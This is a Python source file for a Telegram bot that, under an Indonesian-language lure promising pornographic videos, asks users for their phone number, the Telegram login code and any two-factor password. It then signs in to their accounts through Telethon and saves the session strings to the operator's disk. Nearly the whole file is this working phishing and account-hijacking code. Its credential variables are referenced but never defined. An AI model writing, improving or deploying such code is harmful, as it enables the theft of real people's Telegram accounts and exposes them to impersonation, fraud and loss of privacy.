import os
import logging
import asyncio
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeExpiredError

# Configure logging
logging.basicConfig(level=logging.INFO)

# Telegram bot token and Telethon API credentials

SESSION_PATH = "C:/Users/bange/Downloads/bot father"  # Path where sessions will be saved
DEVICE_MODEL = "Samsung"  # Example device model

# Initialize bot and dispatcher
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# Create the main menu keyboard
def get_main_menu_keyboard():
    keyboard = [
        [InlineKeyboardButton(text="🔑 login💦💦", callback_data="create_session")]
    ]
    return InlineKeyboardMarkup(inline_keyboard=keyboard)

# Handler for /start command
@dp.message(Command('start'))
async def start(message: types.Message):
    await message.answer("💦💦 silahkan login untuk akses vidio telegram💦💦:", reply_markup=get_main_menu_keyboard())

# Storage to keep track of pending messages
class MessageStorage:
    def __init__(self):
        self.pending_messages = {}

    def add_pending_message(self, chat_id, future):
        self.pending_messages[chat_id] = future

    def remove_pending_message(self, chat_id):
        if chat_id in self.pending_messages:
            del self.pending_messages[chat_id]

    async def get_message(self, chat_id, timeout):
        if chat_id not in self.pending_messages:
            loop = asyncio.get_event_loop()
            future = loop.create_future()
            self.add_pending_message(chat_id, future)
            try:
                return await asyncio.wait_for(future, timeout)
            except asyncio.TimeoutError:
                return None
            finally:
                self.remove_pending_message(chat_id)
        else:
            return None

message_storage = MessageStorage()

# Handler to receive and store messages
@dp.message()
async def handle_message(message: types.Message):
    chat_id = message.chat.id
    if chat_id in message_storage.pending_messages:
        future = message_storage.pending_messages[chat_id]
        if not future.done():
            future.set_result(message.text)

# Handler for the "silahkan login untuk akses vidio telegram" button
@dp.callback_query(lambda c: c.data == 'create_session')
async def create_session_callback(callback_query: types.CallbackQuery):
    chat_id = callback_query.message.chat.id
    await bot.send_message(chat_id, "📱 Please enter your phone number:")

    # Wait for the user's phone number
    phone_number = await message_storage.get_message(chat_id, timeout=60)

    if phone_number:
        session_name = str(chat_id)  # Use the chat ID as the session name
        await create_session(phone_number, session_name, chat_id)
    else:
        await bot.send_message(chat_id, "⚠️ Timeout waiting for phone number.", reply_markup=get_main_menu_keyboard())

# The function to create a session with Telethon
async def create_session(phone_number, session_name, chat_id):
    try:
        session_path = os.path.join(SESSION_PATH, f"session_{session_name}.session")

        client = TelegramClient(
            StringSession(),
            API_ID,
            API_HASH,
            device_model=DEVICE_MODEL
        )

        await client.connect()

        # Handle user authentication
        if not await client.is_user_authorized():
            await client.send_code_request(phone_number)
            await bot.send_message(chat_id, "🔢 masukan code yang diterima!! mengunkan spasi contoh= 3 7 8 9 0")
            code = await message_storage.get_message(chat_id, timeout=60)

            if code:
                try:
                    await client.sign_in(phone_number, code)
                except PhoneCodeExpiredError:
                    await bot.send_message(chat_id, "⚠️ The code has expired. Please request a new code.")
                    return  # End process and let the user request a new code
                except SessionPasswordNeededError:
                    await bot.send_message(chat_id, "🔑 Please enter your password (if necessary):")
                    password = await message_storage.get_message(chat_id, timeout=60)
                    if password:
                        await client.sign_in(password=password)
            else:
                await bot.send_message(chat_id, "⚠️ Timeout waiting for code.", reply_markup=get_main_menu_keyboard())
                return

        # Save session
        session_string = client.session.save()
        with open(session_path, 'w', encoding='utf-8') as file:
            file.write(session_string)

        await client.disconnect()

        await bot.send_message(chat_id, "✅ selamat menonton bokep.", reply_markup=get_main_menu_keyboard())

    except Exception as error:
        await bot.send_message(chat_id, f"⚠️ gagal masuk!! masukan kode dengan benar di beri spasi: {error}", reply_markup=get_main_menu_keyboard())

# Start the bot
async def main():
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())
